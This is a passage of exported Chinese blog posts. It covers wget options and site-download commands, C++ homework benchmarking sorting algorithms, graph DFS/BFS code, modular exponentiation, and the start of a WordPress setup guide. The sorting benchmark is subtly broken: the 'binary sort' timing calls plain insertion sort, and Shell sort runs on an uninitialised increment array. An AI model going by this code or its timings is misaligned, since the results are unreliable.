class="line">       --cut-dirs=NUMBER          ignore NUMBER remote directory components.</span><br><span class="line"></span><br><span class="line">HTTP options:</span><br><span class="line">       --http-user=USER        <span class="keyword">set</span> http user to USER.</span><br><span class="line">       --http-password=PASS    <span class="keyword">set</span> http password to PASS.</span><br><span class="line">       --no-cache              disallow server-cached data.</span><br><span class="line">  -E,  --html-extension        save HTML documents with `.html&#x27; extension.</span><br><span class="line">       --ignore-length         ignore `Content-Length&#x27; header field.</span><br><span class="line">       --header=<span class="keyword">STRING</span>         insert <span class="keyword">STRING</span> among the headers.</span><br><span class="line">       --max-redirect          maximum redirections allowed per page.</span><br><span class="line">       --proxy-user=USER       <span class="keyword">set</span> USER as proxy username.</span><br><span class="line">       --proxy-password=PASS   <span class="keyword">set</span> PASS as proxy password.</span><br><span class="line">       --referer=URL           <span class="keyword">include</span> `Referer: URL&#x27; header in HTTP request.</span><br><span class="line">       --save-headers          save the HTTP headers to <span class="keyword">file</span>.</span><br><span class="line">  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.</span><br><span class="line">       --no-http-keep-alive    disable HTTP keep-alive (persistent connections).</span><br><span class="line">       --no-cookies            don&#x27;t use cookies.</span><br><span class="line">       --load-cookies=<span class="keyword">FILE</span>     load cookies from <span class="keyword">FILE</span> before session.</span><br><span class="line">       --save-cookies=<span class="keyword">FILE</span>     save cookies to <span class="keyword">FILE</span> after session.</span><br><span class="line">       --keep-session-cookies  load <span class="keyword">and</span> save session (non-permanent) cookies.</span><br><span class="line">       --post-data=<span class="keyword">STRING</span>      use the POST method; send <span class="keyword">STRING</span> as the data.</span><br><span class="line">       --post-<span class="keyword">file</span>=<span class="keyword">FILE</span>        use the POST method; send contents of <span class="keyword">FILE</span>.</span><br><span class="line">       --content-disposition   honor the Content-Disposition header when</span><br><span class="line">                               choosing local <span class="keyword">file</span> names (EXPERIMENTAL).</span><br><span class="line">       --auth-no-challenge     Send Basic HTTP authentication information</span><br><span class="line">                               without first waiting for the server&#x27;s</span><br><span class="line">                               challenge.</span><br><span class="line"></span><br><span class="line">HTTPS (SSL/TLS) options:</span><br><span class="line">       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,</span><br><span class="line">                                SSLv3, <span class="keyword">and</span> TLSv1.</span><br><span class="line">       --no-check-certificate   don&#x27;t validate the server&#x27;s certificate.</span><br><span class="line">       --certificate=<span class="keyword">FILE</span>       client certificate <span class="keyword">file</span>.</span><br><span class="line">       --certificate-type=TYPE  client certificate type, PEM <span class="keyword">or</span> DER.</span><br><span class="line">       --private-key=<span class="keyword">FILE</span>       private key <span class="keyword">file</span>.</span><br><span class="line">       --private-key-type=TYPE  private key type, PEM <span class="keyword">or</span> DER.</span><br><span class="line">       --ca-certificate=<span class="keyword">FILE</span>    <span class="keyword">file</span> with the bundle of CA&#x27;s.</span><br><span class="line">       --ca-directory=DIR       directory where hash <span class="keyword">list</span> of CA&#x27;s is stored.</span><br><span class="line">       --random-<span class="keyword">file</span>=<span class="keyword">FILE</span>       <span class="keyword">file</span> with random data for seeding the SSL PRNG.</span><br><span class="line">       --egd-<span class="keyword">file</span>=<span class="keyword">FILE</span>          <span class="keyword">file</span> naming the EGD socket with random data.</span><br><span class="line"></span><br><span class="line">FTP options:</span><br><span class="line">       --ftp-user=USER         <span class="keyword">set</span> ftp user to USER.</span><br><span class="line">       --ftp-password=PASS     <span class="keyword">set</span> ftp password to PASS.</span><br><span class="line">       --no-<span class="keyword">remove</span>-listing     don&#x27;t <span class="keyword">remove</span> `.listing&#x27; files.</span><br><span class="line">       --no-glob               turn <span class="keyword">off</span> FTP <span class="keyword">file</span> name globbing.</span><br><span class="line">       --no-passive-ftp        disable the <span class="string">&quot;passive&quot;</span> transfer mode.</span><br><span class="line">       --retr-symlinks         when recursing, get linked-to files (<span class="keyword">not</span> dir).</span><br><span class="line">       --preserve-permissions  preserve remote <span class="keyword">file</span> permissions.</span><br><span class="line"></span><br><span class="line">Recursive download:</span><br><span class="line">  -r,  --recursive          specify recursive download.</span><br><span class="line">  -l,  --level=NUMBER       maximum recursion depth (inf <span class="keyword">or</span> <span class="number">0</span> for infinite).</span><br><span class="line">       --delete-after       delete files locally after downloading them.</span><br><span class="line">  -k,  --convert-links      make links in downloaded HTML point to local files.</span><br><span class="line">  -K,  --backup-converted   before converting <span class="keyword">file</span> X, back up as X.orig.</span><br><span class="line">  -m,  --mirror             shortcut for -N -r -l inf --no-<span class="keyword">remove</span>-listing.</span><br><span class="line">  -p,  --page-requisites    get all images, etc. needed to display HTML page.</span><br><span class="line">       --strict-comments    turn <span class="keyword">on</span> strict (SGML) handling of HTML comments.</span><br><span class="line"></span><br><span class="line">Recursive accept/reject:</span><br><span class="line">  -A,  --accept=<span class="keyword">LIST</span>               comma-separated <span class="keyword">list</span> of accepted extensions.</span><br><span class="line">  -R,  --reject=<span class="keyword">LIST</span>               comma-separated <span class="keyword">list</span> of rejected extensions.</span><br><span class="line">  -D,  --domains=<span class="keyword">LIST</span>              comma-separated <span class="keyword">list</span> of accepted domains.</span><br><span class="line">       --exclude-domains=<span class="keyword">LIST</span>      comma-separated <span class="keyword">list</span> of rejected domains.</span><br><span class="line">       --follow-ftp                follow FTP links from HTML documents.</span><br><span class="line">       --follow-tags=<span class="keyword">LIST</span>          comma-separated <span class="keyword">list</span> of followed HTML tags.</span><br><span class="line">       --ignore-tags=<span class="keyword">LIST</span>          comma-separated <span class="keyword">list</span> of ignored HTML tags.</span><br><span class="line">  -H,  --span-hosts                go to foreign hosts when recursive.</span><br><span class="line">  -L,  --relative                  follow relative links only.</span><br><span class="line">  -I,  --<span class="keyword">include</span>-directories=<span class="keyword">LIST</span>  <span class="keyword">list</span> of allowed directories.</span><br><span class="line">  -X,  --exclude-directories=<span class="keyword">LIST</span>  <span class="keyword">list</span> of excluded directories.</span><br><span class="line">  -np, --no-parent                 don&#x27;t ascend to the parent directory.</span><br></pre></td></tr></table></figure>
<h2 id="常用Wget指令"><a href="#常用Wget指令" class="headerlink" title="常用Wget指令"></a>常用Wget指令</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wget http://xxx.cn					//下载网页源代码</span><br><span class="line">wget -r http://xxx.cn					//递归下载网站源代码</span><br><span class="line">wget -r --no-cookie --no-check-certificate		//忽略SSL证书验证</span><br><span class="line">wget -c -r -p -k http://xxx.cn				//断点续传，整站下载</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>操作系统</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Wget</tag>
      </tags>
  </entry>
  <entry>
    <title>各种排序时间复杂度比较</title>
    <url>/post/52089862/</url>
    <content><![CDATA[<h1 id="各种排序时间复杂度比较"><a href="#各种排序时间复杂度比较" class="headerlink" title="各种排序时间复杂度比较"></a>各种排序时间复杂度比较</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Decimal=<span class="number">1000</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> *elem;</span><br><span class="line">	<span class="keyword">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;L.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(L.elem[i]&lt;L.elem[i<span class="number">-1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			L.elem[<span class="number">0</span>]=L.elem[i];</span><br><span class="line">			L.elem[i]=L.elem[i<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(j=i<span class="number">-2</span>;L.elem[<span class="number">0</span>]&lt;L.elem[j];j--)</span><br><span class="line">			L.elem[j+<span class="number">1</span>]=L.elem[j];</span><br><span class="line">		L.elem[j+<span class="number">1</span>]=L.elem[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BInsertSort</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,high,low,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;L.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		L.elem[<span class="number">0</span>]=L.elem[i];</span><br><span class="line">		low=<span class="number">1</span>;high=i<span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">while</span>(low&lt;=high)</span><br><span class="line">		&#123;</span><br><span class="line">			m=(low+high)/<span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span>(L.elem[<span class="number">0</span>]&lt;L.elem[m])high=m<span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">else</span> low=m+<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=high+<span class="number">1</span>;j--)</span><br><span class="line">			L.elem[j+<span class="number">1</span>]=L.elem[j];</span><br><span class="line">		L.elem[high+<span class="number">1</span>]=L.elem[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellInsert</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> dk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=dk+<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(L.elem[i]&lt;L.elem[i-dk])</span><br><span class="line">		&#123;</span><br><span class="line">			L.elem[<span class="number">0</span>]=L.elem[i];</span><br><span class="line">			<span class="keyword">for</span>(j=i-dk;j&gt;<span class="number">0</span>&amp;&amp;L.elem[<span class="number">0</span>]&lt;L.elem[j];j-=dk)</span><br><span class="line">				L.elem[j+dk]=L.elem[j];</span><br><span class="line">			L.elem[j+dk]=L.elem[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellSort</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> dt[],<span class="keyword">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line">	<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t;k++)</span><br><span class="line">	ShellInsert(L,dt[k]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span><span class="params">(SqList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m=L.length<span class="number">-1</span>,flag=<span class="number">1</span>,t;</span><br><span class="line">	<span class="keyword">while</span>((m&gt;<span class="number">0</span>)&amp;&amp;(flag==<span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		flag=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(L.elem[j]&gt;L.elem[j+<span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				flag=<span class="number">1</span>;</span><br><span class="line">				t=L.elem[j];</span><br><span class="line">				L.elem[j]=L.elem[j+<span class="number">1</span>];</span><br><span class="line">				L.elem[j+<span class="number">1</span>]=t;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		--m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	L.elem[<span class="number">0</span>]=L.elem[low];</span><br><span class="line">	<span class="keyword">int</span> privotkey=L.elem[low];</span><br><span class="line">	<span class="keyword">while</span>(low&lt;high)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(low&lt;high&amp;&amp;L.elem[high]&gt;=privotkey)--high;</span><br><span class="line">			L.elem[low]=L.elem[high];</span><br><span class="line">		<span class="keyword">while</span>(low&lt;high&amp;&amp;L.elem[low]&lt;=privotkey)++low;</span><br><span class="line">			L.elem[high]=L.elem[low];</span><br><span class="line">	&#125;</span><br><span class="line">	L.elem[low]=L.elem[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QSort</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>  pivotloc;</span><br><span class="line">	<span class="keyword">if</span>(low&lt;high)</span><br><span class="line">	&#123;</span><br><span class="line">		pivotloc=Partition(L,low,high);</span><br><span class="line">		QSort(L,low,pivotloc<span class="number">-1</span>);</span><br><span class="line">		QSort(L,pivotloc+<span class="number">1</span>,high);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(SqList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	QSort(L,<span class="number">1</span>,L.length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test</span><span class="params">(SqList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;L.elem[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">1</span>,MAXN=<span class="number">1</span>;</span><br><span class="line">	SqList L;</span><br><span class="line">	<span class="keyword">double</span> run_time,dpFreq;</span><br><span class="line">	_LARGE_INTEGER time_start; <span class="comment">//开始时间</span></span><br><span class="line">	_LARGE_INTEGER time_over; <span class="comment">//结束时间</span></span><br><span class="line">	LARGE_INTEGER f;</span><br><span class="line">	QueryPerformanceFrequency(&amp;f);</span><br><span class="line">	dpFreq=(<span class="keyword">double</span>)f.QuadPart; <span class="comment">//计时器频率</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		MAXN*=<span class="number">10</span>;</span><br><span class="line">		L.elem=<span class="keyword">new</span> <span class="keyword">int</span>[MAXN+<span class="number">1</span>];</span><br><span class="line">		L.length=MAXN;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;第&quot;</span>&lt;&lt;k++&lt;&lt;<span class="string">&quot;次测试, 数量级:&quot;</span>&lt;&lt;MAXN&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">			L.elem[i]=rand();</span><br><span class="line">		QueryPerformanceCounter(&amp;time_start);  <span class="comment">//计时开始</span></span><br><span class="line">		InsertSort(L);</span><br><span class="line">		QueryPerformanceCounter(&amp;time_over);  <span class="comment">//计时结束</span></span><br><span class="line">		run_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;插入排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class="string">&quot;ms&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">			L.elem[i]=rand();</span><br><span class="line">		QueryPerformanceCounter(&amp;time_start);</span><br><span class="line">		InsertSort(L);</span><br><span class="line">		QueryPerformanceCounter(&amp;time_over);</span><br><span class="line">		run_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;二分排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class="string">&quot;ms&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">int</span> dt[<span class="number">100001</span>],t=<span class="number">100</span>;</span><br><span class="line">		QueryPerformanceCounter(&amp;time_start);</span><br><span class="line">		ShellSort(L,dt,t);</span><br><span class="line">		QueryPerformanceCounter(&amp;time_over);</span><br><span class="line">		run_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;希尔排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class="string">&quot;ms&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">			L.elem[i]=rand();</span><br><span class="line">		QueryPerformanceCounter(&amp;time_start);</span><br><span class="line">		BubbleSort(L);</span><br><span class="line">		QueryPerformanceCounter(&amp;time_over);</span><br><span class="line">		run_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;冒泡排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class="string">&quot;ms&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;L.length;i++)</span><br><span class="line">			L.elem[i]=rand();</span><br><span class="line">		QueryPerformanceCounter(&amp;time_start);</span><br><span class="line">		QuickSort(L);</span><br><span class="line">		QueryPerformanceCounter(&amp;time_over);</span><br><span class="line">		run_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;快速排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class="string">&quot;ms&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">if</span>(MAXN&gt;=<span class="number">10000</span>)<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第1次测试, 数量级:10</span><br><span class="line"></span><br><span class="line">插入排序:0.00037758ms</span><br><span class="line">二分排序:0.00037758ms</span><br><span class="line">希尔排序:0.00302064ms</span><br><span class="line">冒泡排序:0.00037758ms</span><br><span class="line">快速排序:0.000755161ms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第2次测试, 数量级:100</span><br><span class="line"></span><br><span class="line">插入排序:0.00717403ms</span><br><span class="line">二分排序:0.00830677ms</span><br><span class="line">希尔排序:0.0256755ms</span><br><span class="line">冒泡排序:0.027941ms</span><br><span class="line">快速排序:0.00717403ms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第3次测试, 数量级:1000</span><br><span class="line"></span><br><span class="line">插入排序:0.65548ms</span><br><span class="line">二分排序:0.746099ms</span><br><span class="line">希尔排序:0.288849ms</span><br><span class="line">冒泡排序:2.10841ms</span><br><span class="line">快速排序:0.0887314ms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第4次测试, 数量级:10000</span><br><span class="line"></span><br><span class="line">插入排序:81.4585ms</span><br><span class="line">二分排序:73.2691ms</span><br><span class="line">希尔排序:4.76695ms</span><br><span class="line">冒泡排序:357.605ms</span><br><span class="line">快速排序:1.55676ms</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>图的邻接矩阵遍历</title>
    <url>/post/4759e4d8/</url>
    <content><![CDATA[<h1 id="图的邻接矩阵遍历"><a href="#图的邻接矩阵遍历" class="headerlink" title="图的邻接矩阵遍历"></a>图的邻接矩阵遍历</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">100</span>][<span class="number">100</span>],vis[<span class="number">100</span>],N;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_1</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(vis[n])<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot; -&gt; &quot;</span>&lt;&lt;n;</span><br><span class="line">		vis[n]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="keyword">if</span>(m[n][i]&amp;&amp;!vis[i])DFS_1(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_2</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt;S;</span><br><span class="line">	vis[n]=<span class="number">1</span>;</span><br><span class="line">	S.push(n);</span><br><span class="line">	<span class="keyword">while</span>(!S.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> t=S.top();</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot; -&gt; &quot;</span>&lt;&lt;t;</span><br><span class="line">		S.pop();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=N<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(m[t][i]&amp;&amp;!vis[i])</span><br><span class="line">			&#123;</span><br><span class="line">				S.push(i);</span><br><span class="line">				vis[i]=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt;Q;</span><br><span class="line">	Q.push(n);</span><br><span class="line">	vis[n]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(!Q.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> t=Q.front();</span><br><span class="line">		Q.pop();</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot; -&gt; &quot;</span>&lt;&lt;t;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="keyword">if</span>(m[t][i]&amp;&amp;!vis[i])</span><br><span class="line">		&#123;</span><br><span class="line">			Q.push(i);</span><br><span class="line">			vis[i]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,ch;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">		m[a][b]=<span class="number">1</span>;</span><br><span class="line">		m[b][a]=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;ch)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="number">1</span>)DFS_1(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="number">2</span>)DFS_2(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="number">3</span>)BFS(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>邻接矩阵</tag>
        <tag>DFS</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>快速幂</title>
    <url>/post/20c47d09/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>未完待续</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>未完待续<br><a id="more"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ll <span class="title">mod_pow</span><span class="params">(ll x,ll n,ll mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ll res=mod_pow(x*x%mod,n/<span class="number">2</span>,mod);</span><br><span class="line">    <span class="keyword">if</span>(n&amp;<span class="number">1</span>)res=res*x%mod;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>快速幂</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建WordPress服务器</title>
    <url>/post/34b16289/</url>
    <content><![CDATA[<p>&emsp;&emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。<br><a id="more"></a><br><strong>安装 Apache</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update <span class="comment"># 首先还是先更新下软件包源</span></span><br><span class="line">sudo apt install apache2</span><br><span class="line">sudo apt install <span class="comment"># 当然再顺便安装下强大的vim编辑器</span></span><br></pre></td></tr></table></figure><br><strong>安装 MySQL</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install mysql-server mysql-client</span><br></pre></td></tr></table></figure><br><strong>安装 PHP</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install php7.0 </span><br><span class="line">sudo apt install php7.0-mysql</span><br></pre></td></tr></table></figure><br><strong>重启服务</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service apache2 restart </span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>安装 phpmyadmin</strong><br>非必须安装，不过安装下方便直接操作数据库，安装时记得选择apache。<br><figure class="highlight bash"><table><tr><td 